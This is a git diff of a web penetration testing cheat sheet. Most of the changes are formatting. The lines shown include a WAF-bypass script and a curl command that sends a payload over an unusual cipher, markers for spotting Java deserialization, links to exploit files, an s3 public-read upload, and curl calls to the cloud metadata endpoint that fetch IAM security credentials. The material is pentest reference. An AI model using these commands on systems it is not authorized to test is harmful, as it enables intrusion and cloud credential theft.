@@ -28,8 +28,8 @@ https://github.com/zidansec/CloudPeler
 
 ### Bypass using cipher not supported by WAF
 `python abuse-ssl-bypass-waf.py -thread 4 -target <target>`  
+`curl --ciphers <cipher> -G <target> -d <payload>`  
 https://github.com/LandGrey/abuse-ssl-bypass-waf  
-`curl --ciphers <cipher> -G <test site> -d <payload>`  
 
 -> Other Doc    
 https://github.com/0xInfection/Awesome-WAF
@@ -399,10 +399,8 @@ Contet-Type: text/xml
 
 #### Identify
 
--> import java.io.serializable
-
--> binary with ac ed 00 05
-
+-> import java.io.serializable  
+-> binary with ac ed 00 05  
 -> base64 starts with rO0AB in web applications
   
 #### Java Lang Runtime Exec - java.lang.Runtime.exec()
@@ -468,15 +466,13 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
   
 ## Cloud
-
 ### Serverless Injection
 
 `echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
 
 ### Meta-data
 
-`curl http://169.254.169.254/latest/api/token`
-
+`curl http://169.254.169.254/latest/api/token`  
 `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
 
 -> Models  
